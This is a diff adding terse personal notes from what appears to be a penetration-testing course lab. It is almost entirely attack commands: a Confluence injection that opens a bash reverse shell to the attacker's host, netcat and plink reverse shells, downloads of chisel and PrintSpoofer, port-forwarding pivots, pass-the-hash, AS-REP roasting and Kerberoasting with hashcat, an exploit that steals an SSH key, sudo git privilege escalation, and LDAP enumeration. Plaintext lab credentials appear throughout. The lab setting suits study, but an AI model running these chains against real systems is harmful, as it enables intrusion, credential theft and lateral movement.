@@ -87,3 +87,353 @@ impacket-psexec 'alex:5391f1724568f48a4aadba748109864c'@192.168.148.226
 impacket-psexec 'itwk04admin:445414c16b5689513d4ad8234391aacf'@192.168.148.226
 impacket-psexec 'offsec:b26462f877427f4f6a87605d587ac60d'@192.168.148.226
 impacket-psexec -hashes :445414c16b5689513d4ad8234391aacf ITWK03/itwk04admin@192.168.148.226
+
+
+
+
+
+
+
+
+192.168.152.63  CONFLUENCE01  
+172.16.152.217  HRSHARES  
+10.4.152.215    PGDATABASE01
+
+Create an SSH local port forward on CONFLUENCE01
+kali machine against the server on HRSHARES 
+
+    Enable Python's pty module after getting a shell on Confluence.
+    Set up port forwarding as in listing 21, changing the port to 4242 and IP.
+    Download ssh_local_client via browser.
+    Use the -h argument for help if issues arise with the binary.
+
+nc -lvnp 4444
+curl http://192.168.152.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.186/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+ssh database_admin@10.4.152.215
+
+sqlpass123
+   P@ssw0rd!
+   Welcome1234
+
+confluence
+ssh -N -L 0.0.0.0:4455:172.16.152.217:4242 database_admin@10.4.152.215
+
+kali
+smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
+
+./ssh_local_client -i 192.168.152.63 -p 4455
+
+
+
+
+
+
+
+10.4.152.215   PGDATABASE01 
+192.168.152.63 CONFLUENCE01
+
+    Configure the remote port forward as instructed in this learning unit.
+    Refer to listing 31, modify the port to 4444, and adjust the IP address.
+    Download the ssh_remote_client via browser.
+
+sudo systemctl start ssh
+sudo ss -ntplu
+
+confluence
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+ssh -N -R 127.0.0.1:4444:10.4.152.215:4444 kali@192.168.45.186
+
+
+kali
+
+./ssh_remote_client -i 127.0.0.1 -p 4444
+
+psql -h 127.0.0.1 -p 2345 -U postgres
+\l
+
+
+
+
+
+192.168.152.64 MULTISERVER03 
+10.4.152.215 PGDATABASE01 
+
+Log in to MULTISERVER03 with the rdp_admin credentials we found in the Confluence database
+   rdp_admin:P@ssw0rd!
+
+use the Windows OpenSSH client to create a port forward that allows you to reach port 4141 on PGDATABASE01 from your Kali machine.
+
+    Configure the port forward as shown in this learning unit.
+    Download the ssh_exe_exercise_client.bin via browser.
+    Make the binary executable and run it through proxychains against 4141 on PGDATABASE01 to reveal the flag.
+
+xfreerdp3 /u:rdp_admin /p:'P@ssw0rd!' /v:192.168.152.64
+ssh -N -R 9998 kali@192.168.45.186
+
+kali
+proxychains ./ssh_exe_exercise_client -i 10.4.152.215 -p 4141
+proxychains psql -h 10.4.50.215 -U postgres
+
+iwr -uri http://192.168.45.186/ssh_exe_exercise_client -Outfile ssh_exe_exercise_client
+
+
+
+
+
+
+
+192.168.152.64 MULTISERVER03
+http://192.168.152.64/umbraco/forms.aspx
+powershell wget -Uri http://192.168.45.186/nc.exe -OutFile C:\Windows\Temp\nc.exe
+nc -nvlp 4446
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.186 4446
+// from shell
+powershell wget -Uri http://192.168.45.186/plink.exe -OutFile C:\Windows\Temp\plink.exe
+C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.186
+
+xfreerdp /u:rdp_admin /p:'P@ssw0rd!' /v:127.0.0.1:9833
+
+cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.186
+
+
+.\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.186
+
+
+wget -Uri http://192.168.45.186/PrintSpoofer64.exe -OutFile C:\Windows\Temp\ps64.exe
+
+
+
+
+
+192.168.152.64 MULTISERVER03 
+10.4.152.215 PGDATABASE01
+
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.152.64
+
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.152.64 connectport=22 connectaddress=10.4.152.215
+netstat -anp TCP | find "2222"
+netsh interface portproxy show all
+
+netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.152.64 localport=2222 action=allow
+
+
+sudo nmap -sS 192.168.50.64 -Pn -n -p2222
+
+ssh database_admin@192.168.152.64 -p2222
+
+
+
+
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.152.64
+
+
+192.168.152.64 MULTISERVER03
+10.4.152.215 PGDATABASE01
+
+Create a port forward on MULTISERVER03 that allows you to run this binary against port 4545 on PGDATABASE01
+
+    Repeat the steps in this learning unit.
+    Use the command in listing 61, and change the port to 4545 and the IP.
+    Download the netsh_exercise_client.bin.
+    Make the binary executable and run it against 4545 on MULTISERVER03 to get the flag.
+
+xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.152.64
+
+netsh interface portproxy add v4tov4 listenport=4545 listenaddress=192.168.152.64 connectport=4545 connectaddress=10.4.152.215
+netsh advfirewall firewall add rule name="port_forward_ssh_4545" protocol=TCP dir=in localip=192.168.152.64 localport=4545 action=allow
+
+./netsh_exercise_client database_admin@192.168.152.64 -p4545
+
+netsh advfirewall firewall delete rule name="port_forward_ssh_4545"
+
+
+-------------------------------------------------------------------------------------------------------------------------------------
+10.4.152.215 PGDATABASE01 
+192.168.152.63 CONFLUENCE01 
+
+There's a server running on port 8008 on PGDATABASE01. Set up a port forward using Chisel that allows you to run the binary you downloaded against port 8008 on PGDATABASE01
+
+./chisel server -p 8080 --reverse
+
+curl http://192.168.152.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new%20java.lang.ProcessBuilder().command('bash'%2C'-c'%2C'wget%20192.168.45.186/chisel2%20-O%20/tmp/chisel2').start()")%7D/
+
+curl http://192.168.152.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new%20java.lang.ProcessBuilder().command('bash'%2C'-c'%2C'chmod%20%2Bx%20/tmp/chisel2').start()")%7D/
+
+curl http://192.168.152.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new%20java.lang.ProcessBuilder().command('bash'%2C'-c'%2C'/tmp/chisel2%20client%20192.168.45.186:8080%20R:socks').start()")%7D/ 
+
+
+- Kali: ./chisel server -p 9999 --reverse
+- Target: chisel client {KALI IP}:9999 R:8000:127.0.0.1:8000
+Then to access, use 127.0.0.1 and whatever port assigned
+-------------------------------------------------------------------------------------------------------------------------------------
+
+
+192.168.152.64 MULTISERVER03 
+
+192.168.152.7 FELINEAUTHORITY
+kali / 7he_C4t_c0ntro11er
+
+10.4.152.215  PGDATABASE01
+database_admin / sqlpass123
+
+192.168.152.63 CONFLUENCE01
+
+ssh database_admin@10.4.152.215
+ssh kali@192.168.152.7
+
+
+
+
+
+
+
+
+
+192.168.152.75 stephanie
+xfreerdp3 /u:stephanie /d:corp.com /v:192.168.152.75
+LegmanTeamBenzoin!!
+
+function LDAPSearch {
+    param (
+        [string]$LDAPQuery
+    )
+
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]'').distinguishedName
+
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+
+    return $DirectorySearcher.FindAll()
+
+}
+
+$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Service Personnel*))"
+
+function LDAPSearch {
+    param (
+        [string]$LDAPQuery
+    )
+
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]'').distinguishedName
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+    return $DirectorySearcher.FindAll()
+}
+
+function Get-NestedMembers {
+    param (
+        [string[]]$DNs
+    )
+
+    $finalUsers = @()
+
+    foreach ($dn in $DNs) {
+        $entry = [ADSI]"LDAP://$dn"
+        if ($entry.objectClass -contains "group") {
+            try {
+                $subMembers = $entry.member
+                $finalUsers += Get-NestedMembers -DNs $subMembers
+            } catch {}
+        }
+        elseif ($entry.objectClass -contains "user") {
+            $finalUsers += $entry
+        }
+    }
+
+    return $finalUsers
+}
+
+# Start from "Service Personnel"
+$groupName = "Service Personnel"
+$results = LDAPSearch "(&(objectClass=group)(cn=$groupName))"
+
+# Grab members
+$members = @()
+foreach ($result in $results) {
+    $members += $result.Properties["member"]
+}
+
+# Resolve users
+$allUsers = Get-NestedMembers -DNs $members
+
+# Dump to file
+$outputPath = "C:\Users\Public\output.txt"
+"=== Dump of user attributes ===`n" | Out-File $outputPath
+
+foreach ($user in $allUsers) {
+    "User: $($user.distinguishedName)" | Add-Content $outputPath
+    $props = $user.psbase.Properties
+    foreach ($propName in $props.PropertyNames) {
+        $value = $props[$propName] -join ", "
+        "$propName : $value" | Add-Content $outputPath
+    }
+    "`n" | Add-Content $outputPath
+}
+
+
+
+
+
+192.168.152.70  dc1 OS Credentials:
+
+192.168.152.75 client75 OS Credentials:
+
+impacket-GetNPUsers -dc-ip 192.168.152.70  -request -outputfile hashes.asreproast corp.com/pete
+Nexus123!
+
+
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.152.70 corp.com/jeff
+HenchmanPutridBonbon11
+sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r append1.rule --force
+
+
+---------------------------------------------------------------------------------------------------
+
+172.16.108.240  VM #1 OS Credentials:
+
+192.168.152.250 VM #6 - WINPREP OS Credentials:
+offsec / lab
+
+192.168.152.244  VM #5 - WEBSRV1 OS Credentials:
+
+172.16.108.243 VM #4 OS Credentials:
+
+192.168.152.242 VM #3 - MAILSRV1 OS Credentials:
+
+172.16.108.241 VM #2 OS Credentials:
+
+searchsploit -x 50420
+
+python3 50420.py http://192.168.152.244 /home/daniela/.ssh/id_rsa
+
+ssh -i id_rsa daniela@192.168.152.244
+tequieromucho
+
+sudo git -p help config
+!/bin/bash
+
+   -#!/bin/bash
+   -
+   -# Script to obtain the current state of the web app from the staging server
+   -
+   -sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/
+   -
+--------------------------------------------------------------------------------------------------------------
+
+
+
+192.168.152.70  dc1 OS Credentials:
+
+
+192.168.152.75 client75 OS Credentials:
+
+
+192.168.152.72  web04
+
+xfreerdp3 /u:jeff /v:192.168.152.75 /p:HenchmanPutridBonbon11
